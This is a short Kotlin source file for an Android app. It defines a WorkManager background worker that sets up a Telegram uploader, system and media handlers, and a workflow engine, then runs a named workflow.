package com.systemlinker.features.workflow

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.systemlinker.base.ConfigStore
import com.systemlinker.features.MediaHandler
import com.systemlinker.features.SystemHandler
import com.systemlinker.features.TelegramUploader

class WorkflowWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {
    override suspend fun doWork(): Result {
        val workflowName = inputData.getString("workflow_name") ?: return Result.failure()
        
        val config = ConfigStore(applicationContext)
        val uploader = TelegramUploader(applicationContext, config.botToken, config.targetChatId)
        val sysHandler = SystemHandler(applicationContext)
        val mediaHandler = MediaHandler(applicationContext)
        
        val engine = WorkflowEngine(applicationContext, uploader, sysHandler, mediaHandler)
        engine.executeWorkflow(workflowName)
        
        return Result.success()
    }
}